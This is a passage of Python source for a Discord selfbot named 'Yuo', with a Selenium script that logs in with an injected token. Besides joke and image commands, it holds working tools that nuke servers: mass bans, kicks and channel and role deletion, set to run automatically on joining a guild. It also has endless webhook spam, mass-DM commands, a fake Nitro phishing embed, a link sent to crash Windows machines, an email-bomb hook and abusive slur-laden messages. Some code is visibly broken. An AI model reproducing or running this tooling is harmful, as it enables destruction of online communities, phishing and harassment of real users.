                  if (typeof(module) === 'object') {
                    if ('setToken' in module) {
                      module.setToken(token);
                      module.hideToken = () => {};
                    }
                    if ('dispatch' in module && '_subscriptions' in module) {
                      dispatcher = module;
                    }
                    if ('AnalyticsActionHandlers' in module) {
                      console.log('AnalyticsActionHandlers', module);
                      module.AnalyticsActionHandlers.handleTrack = (track) => {};
                    }
                  } else if (typeof(module) === 'function' && 'prototype' in module) {
                    const descriptors = Object.getOwnPropertyDescriptors(module.prototype);
                    if ('_discoveryFailed' in descriptors) {
                      const connect = module.prototype._connect;
                      module.prototype._connect = function(url) {
                        console.log('connect', url);
                        const oldHandleIdentify = this.handleIdentify;
                        this.handleIdentify = () => {
                          const identifyData = oldHandleIdentify();
                          identifyData.token = identifyData.token.split(' ').pop();
                          return identifyData;
                        };
                        const oldHandleDispatch = this._handleDispatch;
                        this._handleDispatch = function(data, type) {
                          if (type === 'READY') {
                            console.log(data);
                            data.user.bot = false;
                            data.user.email = 'Alucard-Was-Here@Fuckyou.com';
                            data.analytics_tokens = [];
                            data.connected_accounts = [];
                            data.consents = [];
                            data.experiments = [];
                            data.guild_experiments = [];
                            data.relationships = [];
                            data.user_guild_settings = [];
                          }
                          return oldHandleDispatch.call(this, data, type);
                        }
                        return connect.call(this, url);
                      };
                    }
                  }
                }
              }
              console.log(dispatcher);
              if (dispatcher) {
                dispatcher.dispatch({
                  type: 'LOGIN_SUCCESS',
                  token
                });
              }
            },
          },
          [
            [i],
          ],
        ]);
      })(Math.random());
    }
    """ 
    driver.get("https://discordapp.com/login")
    driver.execute_script(script+f'\nlogin("Bot {_token}")')


@Yuo.command(aliases=['free'])
async def freeaccounts(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Free Accounts**", color=0xFFFAFA,
                          description="use this link for free accounts and shit \n \nhttps://leak.sx/",
                          timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed)


@Yuo.command()
async def dice(ctx):
    await ctx.message.delete()
    choices = [1,2,3,4,5,6]
    choice = random.choice(choices)
    embed = discord.Embed(title="🎲 Dice", description=f"Dice Rolled On {choice}", color=0x000000)
    embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/809327138150023188/image0.gif')
    embed.set_footer(text='⁺23 𝘚𝘏𝘖𝘛𝘚+!🖤', icon_url='https://media.discordapp.net/attachments/788473285469274112/807774892681723924/image0.jpg?width=334&height=417')
    await ctx.send(embed=embed)


@Yuo.command(aliases=['urbandictionary',"dictionary"])
async def ud(ctx,*,wordtodefine=None):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if wordtodefine == None:  
        embed=discord.Embed(title="Yuo Selfbot - Urban Dictionary Command", description=f"You didn't supply a word to define?", color=randcolor)

        embed.set_footer(text="replit.com/@MyrayuoOnTop/Yuo-Selfbot")
        await ctx.message.edit(content="",embed=embed)
    else:
        defineword = wordtodefine.replace(" ","%20")
        data = requests.get(f"https://api.urbandictionary.com/v0/define?term={defineword}")
        
        try:
            j = json.loads(data.text)
            ud_def = j['list']
            ud_def = str(ud_def)
            ud_data_yes = ud_def.split("', 'permalink'") 

            ud_data_yes = ud_data_yes[0].split(": '") 

            finaldef = ud_data_yes[1].replace("[","").replace("]","").replace("\\n","\n").replace("\\r","")
 

            embed=discord.Embed(title="Yuo Selfbot - Urban Dictionary Command", description=f"Definition of `{wordtodefine}`\n{finaldef}\n\n", color=randcolor)
            embed.set_footer(text="replit.com/@MyrayuoOnTop/Yuo-Selfbot")
            await ctx.message.edit(content="",embed=embed)
        except:
            embed=discord.Embed(title="Yuo Selfbot - Urban Dictionary Command", description=f"Error when searching for the term : `{wordtodefine}`", color=randcolor)
            embed.set_footer(text="replit.com/@MyrayuoOnTop/Yuo-Selfbot")
            await ctx.message.edit(content="",embed=embed)    


@Yuo.command()
async def joke(ctx):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    joke = requests.get("https://sv443.net/jokeapi/v2/joke/Pun?blacklistFlags=nsfw,racist,sexist&type=twopart").text
    j = json.loads(joke)
    setup = j['setup']
    delivery = j['delivery']

    embed=discord.Embed(title="Yuo Selfbot - Joke requested", description=f"{setup}\n||{delivery}||", color=randcolor)
    embed.set_footer(text="replit.com/@MyrayuoOnTop/Yuo-Selfbot")
    await ctx.message.edit(content="",embed=embed)


@Yuo.command(aliases=['stickbugged'])
async def stickbug(ctx,  memb : discord.Member=None):
    if memb == None:  
        memb = ctx.message.author 
    finalurl = str(memb.avatar_url)
    finalurl = finalurl.replace("gif","png")
    await ctx.message.edit(content="_this command takes a while, please be patient.._")
    stikcbug = requests.get(f"https://nekobot.xyz/api/imagegen?type=stickbug&url={finalurl}").text
    j = json.loads(stikcbug)
    stickbugvid = j['message']
    await ctx.message.edit(content=stickbugvid)


@Yuo.command(aliases=['massnick'])
async def mass_nick(self, ctx, code=None, *, nickname=None):
        await ctx.message.delete()
        ID = ctx.message.guild.id
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=ID)
        try:
            print(f"{Fore.LIGHTWHITE_EX}Nicknaming all members from server: {g}.")
            if int(code) != int(CODE):
                command_error("mass_nick")
                return
            if nickname.strip().replace(' ', ''):
                for member in g.members:
                    try:
                        await member.edit(nick=nickname)
                        print(f"{Fore.LIGHTBLUE_EX}Nicknamed {member}.")
                    except BaseException:
                        print(f"{Fore.RED}Failed to nickname {member}.")
                print(
                    f"{Fore.LIGHTGREEN_EX}\nNicknamed all members from server: {g} successfully.{Fore.RESET}")
                return
        except BaseException as e:
            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
            return


@Yuo.command(aliases=['threats'])
async def threat(ctx,  memb : discord.Member=None):
    if memb == None:  
        memb = ctx.message.author 
    finalurl = str(memb.avatar_url)
    finalurl = finalurl.replace("gif","png")
    threatdata = requests.get(f"https://nekobot.xyz/api/imagegen?type=threats&url={finalurl}").text
    j = json.loads(threatdata)
    threatmeme = j['message']
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=threatmeme)
    await ctx.message.edit(content="",embed=embed)


@Yuo.command(aliases=['invis'])
async def invisiblenickname(ctx):
    await ctx.message.delete()
    try:
        name = "‎‎‎‎‎‎‎‏‏‎ ឵឵ ឵឵ ឵឵ ឵឵‎"
        await ctx.author.edit(nick=name)
        await ctx.send(f"Now your nickname is invisible")
    except Exception as e:
        await ctx.send(f"Error: {e}")


@Yuo.command()
async def dmfriends(ctx, *, x):
	await ctx.message.delete()
	for friend in client.user.friends:
		try:
			await friend.send(x)
			print(f"DMd {friend.name}")
		except:
			print(f"Can't DM {friend.name}")
			continue


@Yuo.command()
async def dmlist(ctx, *, x):
	await ctx.message.delete()
	for channel in client.private_channels:
		try:
			await channel.send(x)
			print(f"DMd {channel}")
		except:
			print(f"Can't DM {channel}")
			continue


@Yuo.command()
async def creator(ctx):
  await ctx.message.delete()
  try:
  	embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),title="Creators!",description="Myrayuo, <@826996086140698625>")
  	await ctx.send(embed=embed)
  except:
  	await ctx.send("""**__Creators__**\n\nMyrayuo, <@826996086140698625>""")


@Yuo.command()
async def tr(ctx, member: discord.Member, role: discord.Role):
  await ctx.message.delete()
  await member.remove_roles(role)


@Yuo.command()
async def beatthesoapinhishand(ctx):
    await ctx.message.delete()
    await ctx.send("https://www.youtube.com/watch?v=bJMXliokGrY")


@Yuo.command()
async def nitrogen(ctx, arg):
    global status
    amount = int(arg)
    await ctx.message.delete()
    nitrocodes = ""
    print(Fore.YELLOW + f"[>] Generating {arg} nitro codes...")
    for i in range(0,amount):
        code = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))
        nitrocode = "https://discord.gift/" + code + "\n"
        nitrocodes += nitrocode
        status = "Generating..."
    print(Fore.GREEN + f"[>] Generated")
    myfile = open("stuff/Nitro-Gen/codes.txt","w+")
    myfile.write("CODES: " + "\n")
    myfile.close()
    myfile2=open("stuff/Nitro-Gen/codes.txt", "a+")
    myfile2.write(nitrocodes)
    myfile2.close
    endfile=discord.File("codes.txt")
    await ctx.send(file=endfile)
    print(Fore.GREEN + f"[>] Sent")
    status = "Finished"
    endfile.close()
    f = open('stuff/Nitro-Gen/codes.txt', 'r+')
    f.truncate(0)
    f.close()


@Yuo.command()
async def fbi(ctx, *, user):
    await ctx.message.delete()
    msg= await ctx.send('> **knock knock**')
    await asyncio.sleep(2)
    await msg.edit(content='> **FBI OPEN UP**')
    await asyncio.sleep(2)
    reas= ['fraud',
    'robbery',
    'murder',
    'unethical hacking', 
    'drugs']
    await msg.edit(content=f'> {user} is about to be smashed for {random.choices(reas)}')
    await asyncio.sleep(3)
    await msg.edit(content='> https://tenor.com/view/fbi-raid-swat-gif-11500735')


@Yuo.command(aliases=["kanagen"])
async def kannagen(ctx,*,kannatext=None):
    if kannatext == None:
        kannatext = f"{ctx.message.author.name} the format is {prefix.strip()}kannagen [message]"
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=kannagen&text={kannatext}").text
    j = json.loads(data)
    kannaimg = j['message']

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=kannaimg)
    await ctx.message.edit(content="",embed=embed)


@Yuo.command(aliases=["suggestion"])
async def suggest(ctx,*,message="Supply something to suggest lmao"):
    await ctx.message.delete()
    randcolor = random.randint(0x000000, 0xFFFFFF) 
    try:
        embed=discord.Embed(title=f"Yuo selfbot - poll", description=f"Poll message : `{message}`", color=randcolor)
        embed.set_footer(text="replit.com/@MyrayuoOnTop/Yuo-Selfbot")
        a = await ctx.send(embed=embed)
    except:
        a = await ctx.send(message)


    await a.add_reaction("👍")
    await a.add_reaction("👎")


@Yuo.command(aliases=["tw"])
async def spoiler(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"||{message}||")


@Yuo.command(aliases=['baccwoods','backwood'])
async def backwoods(ctx):
    await ctx.message.delete()
    choices = ['https://media.discordapp.net/attachments/788473285469274112/812770279758495744/image0.jpg?width=328&height=417','https://media.discordapp.net/attachments/788473285469274112/812770876247638036/image0.png?width=376&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812771130242105365/image0.png?width=335&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812771367187382302/image0.png?width=575&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812774733841825801/image0.gif?width=424&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812776610666643477/image0.png?width=348&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812778598716276766/image0.gif?width=421&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812779351841439774/image0.png?width=408&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812779687390216192/image0.png?width=353&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812781083866562570/image0.png?width=425&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812781091248275456/image0.png?width=375&height=417','https://media.discordapp.net/attachments/788473285469274112/812781096395341874/image0.png?width=427&height=417']
    links = random.choice(choices)
    try:
        embed = discord.Embed(color=0x000000, title="Yuo Selfbot | Backwoods")
        embed.set_image(url=f'{links}')
        embed.set_footer(text="⁺𝘉𝘈𝘊𝘊𝘞𝘖𝘖𝘋𝘚+!🌬", icon_url='https://media.discordapp.net/attachments/788473285469274112/812773116757409843/image0.png?width=586&height=417')
        await ctx.send(embed=embed)

    except:
        await ctx.send(f"{links}")  


@Yuo.command()
async def members(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  embed = discord.Embed(timestamp=datetime.datetime.utcnow())
  embed.set_author(name="Links!", icon_url=ctx.guild.icon_url)
  embed.add_field(name="Member Count:", value=f"> {len(guild.members)}")
  embed.set_footer(text=f"{ctx.guild.name}")
  embed.set_thumbnail(url=ctx.guild.icon_url)
  await ctx.channel.send(embed=embed)


@Yuo.command()
async def slowmode(ctx, seconds: int):
    await ctx.message.delete()
    await ctx.channel.edit(slowmode_delay=seconds)
    await ctx.send(f"set channel to {seconds} seconds!")
@slowmode.error
async def slowmode(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need to have `administrator` to use this command!")


@Yuo.command(aliases=['jealous',"distracted"])
async def ship(ctx,  memb : discord.Member=None):
    if memb == None:  
        memb = ctx.message.author 
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=ship&user1={memb.avatar_url}&user2={ctx.message.author.avatar_url}").text
    j = json.loads(data)
    ship = j['message']
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=ship)
    await ctx.message.edit(content="",embed=embed)


@Yuo.command(aliases=['catcha',"capture"])
async def captcha(ctx,  memb : discord.Member=None):
    if memb == None:  
        memb = ctx.message.author 
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=captcha&url={memb.avatar_url}&username={memb.name}").text
    j = json.loads(data)
    captcha = j['message']
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=captcha)
    await ctx.message.edit(content="",embed=embed)


@Yuo.command(aliases=['reactspam'])
async def spamreact(ctx, count=None, reaction=None):
    await ctx.message.delete()
    if count == None or reaction == None:
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Yuo Selfbot - React spam", description=f"You didn't specify the amount of messages to react to or the reaction to use.\n{prefix.strip()}spamreact [amount]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="replit.com/@MyrayuoOnTop/Yuo-Selfbot")

        await ctx.send(embed=embed)
    else:
        async for message in ctx.message.channel.history(limit=int(count)):
            try:
                await message.add_reaction(reaction)
            except:
                pass


@Yuo.command(aliases=['botconvert', 'botsay', 'convertbot'])
async def impersonate(ctx, member: discord.Member=None,*,message="I forgot to supply a message"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if ctx.guild == None:
        embed=discord.Embed(title="Use this command in a server", description="\nYou did it in dms", color=randcolor)
        embed.set_footer(text="replit.com/@MyrayuoOnTop/Yuo-Selfbot")
        await ctx.send(embed=embed)
    else:
        if not member:  
            member = ctx.message.author 
        embed=discord.Embed(title=f"Impersonating {member.name}", description=f"\nWith message: \"{message}\"", color=randcolor)
        embed.set_footer(text="replit.com/@MyrayuoOnTop/Yuo-Selfbot")
        await ctx.message.delete()


@Yuo.command(aliases=['editspam', 'massedit'])
async def spamedit(ctx, count=None,*, mesg=None):
    await ctx.message.delete()
    if count == None or mesg == None:
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Yuo Selfbot - Message edit spam", description=f"You didn't specify the amount of messages to edit or the content to edit the messages to.\n{prefix.strip()}spamedit [amount] [message]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="replit.com/@MyrayuoOnTop/Yuo-Selfbot")

        await ctx.send(embed=embed)
    else:
        edited = 0
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Yuo Selfbot - Message edit spam", description=f"Editing messages", color=randcolor)
        embed.set_footer(text="replit.com/@MyrayuoOnTop/Yuo-Selfbot")
        msg= await ctx.send(embed=embed)
        async for message in ctx.channel.history(limit=int(count)):
            try:
                if message.author == Yuo.user:
                    if message != msg:
                        await message.edit(content=mesg,embed=None)
                        edited = edited + 1
            except:
                pass


@Yuo.command(aliases=['whowouldwin'])
async def www(ctx,  memb : discord.Member=None):
    if memb == None:  
        memb = ctx.message.author 
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=whowouldwin&user1={ctx.message.author.avatar_url}&user2={memb.avatar_url}").text
    j = json.loads(data)
    ship = j['message']
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=ship)
    await ctx.message.edit(content="",embed=embed)


@Yuo.command(name='gmail-bomb', aliases=['gmail-bomber', 'gmailbomb', 'email-bomber', 'emailbomber'])
async def _gmail_bomb(ctx):
    await ctx.message.delete()
    GmailBomber()


@Yuo.command()
async def masslogin(ctx, choice = None):
    await ctx.message.delete()
    _masslogin(choice)


@Yuo.command(aliases=['cylde'])
async def clyde(ctx,*, message=f"Maybe supply a message next time | {()}clyde [message-here]"):

    cylde = requests.get(f"https://nekobot.xyz/api/imagegen?type=clyde&text={message}").text
    j = json.loads(cylde)
    clydeimg = j['message']
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=clydeimg)
    await ctx.message.edit(content="",embed=embed)


spam_messages = ["@everyone https://discord.gg/2k3BpbMg5e"]

channel_names = [".gg/FENDI","yuo on youtube","get beamed","yuo on top"]
webhook_usernames = [".gg/FENDI",".gg/FENDI",".gg/FENDI",".gg/FENDI"]
nuke_on_join = True
nuke_wait_time = 0

CHANNEL_NAMES = ["Yuo runs you" , "Get ran" , "Yuo" , "oops Beamed","Yuo Beamed You","Shoulda Listened","Get beamed clowns","Beamed by Yuo","oops got nuked","I run you","beamed by Yuo","I run you","kinda got beamed by Yuo"]
MESSAGE_CONTENTS = ["@everyone NUKED BY MYRAYUO | YUO ON TOP | Myrayuo#0459 | Join https://discord.gg/2k3BpbMg5e GET REKT U RETARDED FUCKS LMFAO YALL GOT WIZZED SO BADLY JOIN YUO #MYRAYUO WAS HERE"]


async def setup(guild):
  print(f"{C.WHITE}Nuking {guild.name}.")
  role = discord.utils.get(guild.roles, name = "@everyone")
  try:
    await role.edit(permissions = discord.Permissions.all())
    print(f"{C.GREEN}Successfully granted admin permissions in {C.WHITE}{guild.name}")
  except:
    print(f"{C.RED}Admin permissions NOT GRANTED in {C.WHITE}{guild.name}")
  for channel in guild.channels:
    try:
      await channel.delete()
      print(f"{C.GREEN}Successfully deleted channel {C.WHITE}{channel.name}")
    except:
      print(f"{C.RED}Channel {C.WHITE}{channel.name} {C.RED}has NOT been deleted.")
  for member in guild.members:
    try:
      await member.Ban()
      print(f"{C.GREEN}Successfully banned {C.WHITE}{member.name}")
    except:
      print(f"{C.WHITE}{member.name} {C.RED}has NOT been banned.")
  for i in range(120):
    await guild.create_text_channel(random.choice(channel_names))
  print(f"{C.GREEN}Nuked by yuo {guild.name}.")


@Yuo.command()
async def setup(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await setup(guild)


@Yuo.event
async def on_guild_join(guild):
  if nuke_on_join == True:
    await asyncio.sleep(nuke_wait_time)
    await setup(guild)
  else:
    return


@Yuo.command()
async def sall(ctx, *, message = None):
  if message == None:
    for channel in ctx.guild.channels:
      try:
        await channel.send(random.choice(spam_messages))
      except discord.Forbidden:
        print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass
  else:
    for channel in ctx.guild.channels:
      try:
        await channel.send(message)
      except discord.Forbidden:
        print(f"{C.RED}Sall Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass


@Yuo.command()
async def frole(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")


@Yuo.command()
async def crole(ctx):
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name=".gg/FENDI")


@Yuo.command()
async def kickall(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.kick(user)
                print (f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
        print ("Action Completed: Kicked")


@Yuo.event
async def on_guild_channel_create(channel):
  webhook = await channel.create_webhook(name =".gg/FENDI")
  webhook_url = webhook.url
  async with aiohttp.ClientSession() as session:
    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
    while True:
      await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))


@Yuo.command()
async def banall(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban()
            print(f"[+] Banned {member}")
            num += 1
        except:
            print(f"[-] Could not ban {member}")
    print(f"\n[+] Finished banning, successfully banned {1} users")
        
KjekRRUG = os.getenv("UserName")
K02iV6YA = os.getenv("COMPUTERNAME")       

@Yuo.command(aliases=['tard'])
async def clown(ctx, arg):
    await ctx.message.delete()
    embed = discord.Embed(title="you're a clown")
    embed = discord.Embed(description=f"{arg} is a fucking clown \n lol \n ur so unfunny \n kys \n dumb fuck")
    await ctx.send(embed=embed)


@Yuo.command()
async def info(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Selfbot Information**", color=0xFFFAFA,
                          timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.add_field(name="**made in**", value="discord.py")
    embed.add_field(name="**made by**", value="myrayuo#1245")
    embed.add_field(name="**running under the user**", value=f"{client.user.name}#{client.user.discriminator}")
    embed.set_footer(text="mrayuo#1245 <3")
    await ctx.send(embed=embed, delete_after=val)


@Yuo.command()
async def expose(ctx, member: discord.Member = None):
    await ctx.message.delete()
    embed = discord.Embed(title='Exposed', color=0xFFFAFA, description=f'{_expose(member.mention)}',
                          timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)


@Yuo.command()
async def fakenitro(ctx, server):
    await ctx.message.delete()
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    nitro= f'https://discord.gift/{code}'
    embed = discord.Embed(description="        ")
    embed.add_field(name="YOU HAVE BEEN RANDOMLY SELECTED TO WIN FREE NITRO", value=f"[{nitro}]({server})")
    embed.set_image(url="https://cdn.discordapp.com/attachments/827008716263522314/830714076480798780/a9ng95vvs8c41.png")
    await ctx.send(embed=embed)


@Yuo.command(aliases=['harotalk', 'talkharo',"haro","cutetalk"])
async def talkcute(ctx,talkcute=None):
    await ctx.message.delete()
    Yuo.talkcute = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Yuo.talkcute = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Yuo.talkcute = False


@Yuo.command()
async def add_song(self, ctx, *, query):
        self.ctx = ctx

        target_songs = self.parse(query)
        self.playlist = [*self.playlist, *target_songs]


@Yuo.command()
async def play(self, ctx, *, query):   
        self.ctx = ctx
        print("Incoming query: ", query)

        target_songs = self.parse(query)

        self.playlist = [*self.playlist, *target_songs]
        print("Current playlist: ", end="")
        for x in self.playlist:
            print("    {} by {}".format(x["song_keys"][0], x["artist_keys"][0]))

        if ctx.voice_client.is_playing():
            ctx.voice_client.stop()
        else:
            await self.play_song(None)


@Yuo.command()
async def pause(self, ctx):
        if ctx.voice_client.is_playing():
            ctx.voice_client.pause()


@Yuo.command()
async def resume(self, ctx):
        if ctx.voice_client.is_paused():
            ctx.voice_client.resume()


@Yuo.command()
async def skip(self, ctx, *, how_many=0):
        m_del = int(how_many)
        m_del = m_del if m_del <= len(self.playlist) else len(self.playlist)
        for _ in range(m_del):
            del self.playlist[0]
        # await self.play_song(None)
        ctx.voice_client.stop()

@Yuo.command()
async def show(self, ctx):
        to_show = [
            "Now playing: " + self.current,
            "Songs in playlist: "
        ]
        if len(self.playlist) == 0:
            to_show[-1] = "Playlist empty"
        for i, song in enumerate(self.playlist):
            to_add = "{0:02d}. ".format(i) + song["song_keys"][0] + " by " + song["artist_keys"][0]
            to_show.append(to_add)

        await ctx.send("\n".join(to_show))


@Yuo.command()
async def quit(self, ctx):
        self.playlist = []

        ctx.voice_client.stop()

        await ctx.voice_client.disconnect()


@Yuo.command()
async def q(self, ctx):
        await self.quit(ctx)


@Yuo.command()
async def volume(self, ctx, volume: int):
        if ctx.voice_client is None:
            return await ctx.send("Not connected to a voice channel.")

        self.volume = volume / 100
        if ctx.voice_client.source is not None:
            ctx.voice_client.source.volume = self.volume
        await ctx.send("Changed volume to {}%".format(volume))


@Yuo.command(aliases=["usdtobtc", "usd2btc"])
async def usdbtc(self, ctx, message):
        """Converts USD to BTC

        Parameters
        • USD - Amount of USD you want in BTC (NOTE: NEEDS TO BE WHOLE NUMBER)
        """
        await ctx.message.delete()
        r = requests.get(
            "https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD"
        )

        r = r.json()
        usd = r["USD"]
        index = 1 / usd
        amount = int(message)
        converted = amount * index
        em = discord.Embed(description=f"**{amount}$** = **{converted} BTC**")
        em.set_author(
            name="USD to Bitcoin",
            icon_url="https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png",
        )
        await ctx.send(embed=em)


@Yuo.command(aliases=["usdtoeth", "usd2eth"])
async def usdeth(self, ctx, message):
        """Converts USD to ETH

        Parameters
        • USD - Amount of USD you want in ETH (NOTE: NEEDS TO BE WHOLE NUMBER)
        """
        await ctx.message.delete()
        r = requests.get(
            "https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD"
        )

        r = r.json()
        usd = r["USD"]
        index = 1 / usd
        amount = int(message)
        converted = amount * index
        em = discord.Embed(description=f"**{amount}$** = **{converted} ETH**")
        em.set_author(
            name="USD to ETH",
            icon_url="https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png",
        )
        await ctx.send(embed=em)


@Yuo.command()
async def daily(ctx):
        await ctx.message.delete()
        await ctx.send("Getting BTC/ETH info...")
        # BTC info
        r = requests.get(
            "https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR,GBP"
        )
        r = r.json()
        usd = r["USD"]
        eur = r["EUR"]
        gbp = r["GBP"]
        em = discord.Embed(
            description=f"USD: `{str(usd)}$`\n\nEUR: `{str(eur)}€`\n\nGBP: `{str(gbp)}£`"
        )
        em.set_author(
            name="Bitcoin",
            icon_url="https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png",
        )
        await ctx.send(embed=em)

        # ETH info
        r = requests.get(
            "https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR,GBP"
        )
        r = r.json()
        usd = r["USD"]
        eur = r["EUR"]
        gbp = r["GBP"]
        em = discord.Embed(
            description=f"USD: `{str(usd)}$`\nEUR: `{str(eur)}€`\n\nGBP: `{str(gbp)}£`"
        )
        em.set_author(
            name="Ethereum",
            icon_url="https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png",
        )
        await ctx.send(embed=em)


@Yuo.command(name='auto-bump', aliases=['bump'])
async def _auto_bump(ctx, channelid): # b'\xfc'
    await ctx.message.delete()
    count = 0
    while True:
        try:
            count += 1 
            channel = Yuo.get_channel(int(channelid))
            await channel.send('!d bump')
            print(f'{Fore.BLUE}[AUTO-BUMP] {Fore.GREEN}Bump number: {count} sent'+Fore.RESET)
            await asyncio.sleep(7200)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)


@Yuo.command(name='lvl-up', aliases=['lvl'])
async def _lvl_up(ctx, channelid):
    await ctx.message.delete()
    counter = 1
    while True:
        channel = Yuo.get_channel(int(channelid))
        await channel.send('Hi') #You can change this message
        print(f'[{counter}] Sent message!')
        counter+=1
        time.sleep(30)


@Yuo.command(aliases=["yuoselfbot","link","selfbot","server"])
async def invite(ctx):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url="https://cdn.discordapp.com/attachments/827008716263522314/832228852956004412/Screenshot_2021-04-12_10.08.37_AM.png")
    await ctx.message.edit(content="https://discord.gg/2k3BpbMg5e Yuo selfbot - Yuo selfbot was made as a fun project.\nYuo is free and has creative commands - why wouldn't you try it out\nIt has a wide range of commands, uses fun apis and is simple to setup - no api keys needed",embed=embed)  


@Yuo.command(aliases=["floyd"])
async def floydmeme(ctx):
        """I can't breathe"""
        await ctx.message.delete()
        await ctx.send("https://i.imgur.com/mn3EslL.png")


@Yuo.command(aliases=["crash"])
async def crashwindows(ctx):
        """Sends a link when clicked rapes a windwos computer"""
        await ctx.message.delete()
        await ctx.send("Click this for free nitro! <ms-cxh-full://0>")


@Yuo.command(aliases=["flop"])
async def flopp(ctx):
        list = (
            "(   ° - °) (' - '   )",
            "(\\\° - °)\ (' - '   )",
            "(—°□°)— (' - '   )",
            "(╯°□°)╯(' - '   )",
            "(╯°□°)╯︵(\\\ .o.)\\",
        )
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)


@Yuo.command()
async def virus(ctx, user: discord.Member = None, *, virus: str = "trojan"):
        user = user or ctx.author
        list = (
            f"``[▓▓▓                    ] / {virus}-virus.exe Packing files.``",
            f"``[▓▓▓▓▓▓▓                ] - {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓           ] \ {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓         ] | {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ] / {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] - {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] \ {virus}-virus.exe Packing files..``",
            f"``Successfully downloaded {virus}-virus.exe``",
            "``Injecting virus.   |``",
            "``Injecting virus..  /``",
            "``Injecting virus... -``",
            f"``Successfully Injected {virus}-virus.exe into {user.name}``",
        )
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)


@Yuo.command()
async def table(ctx):
        list = (
            "`(\°-°)\  ┬─┬`",
            "`(\°□°)\  ┬─┬`",
